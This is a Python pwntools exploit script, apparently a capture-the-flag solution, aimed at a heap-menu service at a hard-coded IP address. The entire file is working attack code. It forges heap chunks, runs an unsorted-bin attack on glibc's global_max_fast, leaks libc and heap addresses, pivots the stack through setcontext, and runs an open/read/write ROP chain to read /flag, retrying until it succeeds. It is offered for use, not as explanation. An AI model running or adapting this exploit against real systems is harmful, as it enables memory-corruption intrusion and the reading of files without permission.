#!/usr/bin/env python
# encoding: utf-8

from pwn import *

context(arch='amd64', os='linux', endian='little')
r = None

def add(size):
    r.recvuntil(">>")
    r.sendline("1")
    r.recvuntil("size:")
    r.sendline(str(size))

def edit(offset, size, content):
    r.recvuntil(">>")
    r.sendline("2")
    r.recvuntil("offset:")
    r.sendline(str(offset))
    r.recvuntil("size:")
    r.sendline(str(size))
    r.recvuntil("content:")
    r.send(content)

def free(offset):
    r.recvuntil(">>")
    r.sendline("3")
    r.recvuntil("offset:")
    r.sendline(str(offset))

def exploit(host):
    global r
    port = 10000

    while True:
        try:
            r = remote(host, port)
            libc = ELF("./libc.so.6")

            libc_base = 0x00007ffff7a53000
            edit(0, 0x10, p64(0x0)+p64(0x71))
            edit(0x70, 0x10, p64(0x0)+p64(0x71))
            edit(0xe0, 0x10, p64(0x0)+p64(0x71))

            free(0x80)

            edit(0x150, 0x10, p64(0x0)+p64(0x91))
            edit(0x1e0, 0x10, p64(0x90)+p64(0x91))
            edit(0x270, 0x10, p64(0x90)+p64(0x91))

            ptr = 0x308
            edit(ptr-0x18, 0x10, p64(0x0)+p64(0x91))
            edit(ptr-0x18+0x90, 0x10, p64(0x90)+p64(0x91))
            edit(ptr-0x18+0x90+0x90, 0x10, p64(0x90)+p64(0x91))
            free(ptr-0x18+0x10)
            add(0x80)

            free(0x150+0x10)

            # unsorted bin attack : global_max_fast(0x39F7D0)
            # canary 0x7ffff7df74f0
            edit(0x150+0x18, 0x2, p64(libc_base+0x39F7D0-0x10)[:2])
            add(0x80)

            #raw_input()

            def write_with_heap_address(target, value):
                unsorted_bin = 0x00007ffff7df0b58
                stdout = target
                magic_size = ((stdout-unsorted_bin)/8+12)*0x10
                edit(value+8, 0x8, p64(magic_size+1))
                edit(value+magic_size, 0x10, p64(0x0)+p64(0x91))
                free(value+0x10)
                return magic_size

            write_with_heap_address(0x7ffff7df1638, 0x300)
            edit(0x350, 0x10, p64(0x0)+p64(0x71))
            edit(0x350+0x70, 0x10, p64(0x0)+p64(0x71))
            free(0x350+0x10)
            write_with_heap_address(0x7ffff7df1628, 0x380)


            r.recv(8)
            r.recv(0x10)
            libc_base = u64(r.recv(8))-0x39e683
            r.recv(0x48)
            heap_base = u64(r.recv(8))-0x70
            log.info(hex(libc_base))
            log.info(hex(heap_base))

            sz = write_with_heap_address(0x7ffff7df2788, 0x480)
            edit(0x480+0x10, 0x8, p64(libc_base+0x43565))
            add(sz-0x10)

            payload = ''
            payload += p64(0xdeadbeefdeadbeef)*0x20
            payload = payload[:0xa0]+p64(heap_base+0x9000)+p64(libc_base+0x937)+payload[0xb0:]
            edit(0x8000, len(payload), payload)

            flag_str = '/flag\0'
            edit(0x8800, len(flag_str), flag_str)


            pop_rdi_ret = libc_base+0x1feea
            pop_rsi_ret = libc_base+0x1fe95
            pop_rdx_ret = libc_base+0x1b92

            rop  = ''
            rop += p64(pop_rdi_ret)
            rop += p64(heap_base+0x8800)
            rop += p64(pop_rsi_ret)
            rop += p64(0)
            rop += p64(pop_rdx_ret)
            rop += p64(0)
            rop += p64(libc_base+libc.symbols['open'])

            rop += p64(pop_rdi_ret)
            rop += p64(3)
            rop += p64(pop_rsi_ret)
            rop += p64(heap_base+0xa000)
            rop += p64(pop_rdx_ret)
            rop += p64(0x40)
            rop += p64(libc_base+libc.symbols['read'])

            rop += p64(pop_rdi_ret)
            rop += p64(1)
            rop += p64(pop_rsi_ret)
            rop += p64(heap_base+0xa000)
            rop += p64(pop_rdx_ret)
            rop += p64(0x40)
            rop += p64(libc_base+libc.symbols['write'])
            edit(0x9000, len(rop), rop)

            """
            0x7ffff7a96565 <setcontext+53>:      mov    rsp,QWORD PTR [rdi+0xa0]
            0x7ffff7a9656c <setcontext+60>:      mov    rbx,QWORD PTR [rdi+0x80]
            0x7ffff7a96573 <setcontext+67>:      mov    rbp,QWORD PTR [rdi+0x78]
            0x7ffff7a96577 <setcontext+71>:      mov    r12,QWORD PTR [rdi+0x48]
            0x7ffff7a9657b <setcontext+75>:      mov    r13,QWORD PTR [rdi+0x50]
            0x7ffff7a9657f <setcontext+79>:      mov    r14,QWORD PTR [rdi+0x58]
            0x7ffff7a96583 <setcontext+83>:      mov    r15,QWORD PTR [rdi+0x60]
            0x7ffff7a96587 <setcontext+87>:      mov    rcx,QWORD PTR [rdi+0xa8]
            0x7ffff7a9658e <setcontext+94>:      push   rcx
            0x7ffff7a9658f <setcontext+95>:      mov    rsi,QWORD PTR [rdi+0x70]
            0x7ffff7a96593 <setcontext+99>:      mov    rdx,QWORD PTR [rdi+0x88]
            0x7ffff7a9659a <setcontext+106>:     mov    rcx,QWORD PTR [rdi+0x98]
            0x7ffff7a965a1 <setcontext+113>:     mov    r8,QWORD PTR [rdi+0x28]
            0x7ffff7a965a5 <setcontext+117>:     mov    r9,QWORD PTR [rdi+0x30]
            0x7ffff7a965a9 <setcontext+121>:     mov    rdi,QWORD PTR [rdi+0x68]
            0x7ffff7a965ad <setcontext+125>:     xor    eax,eax
            """
            free(0x8000)
            flag = r.recvline()
            print flag
            break
        except EOFError:
            continue


if __name__ == '__main__':
    host = '34.92.248.154'
    exploit(host)
    r.interactive()
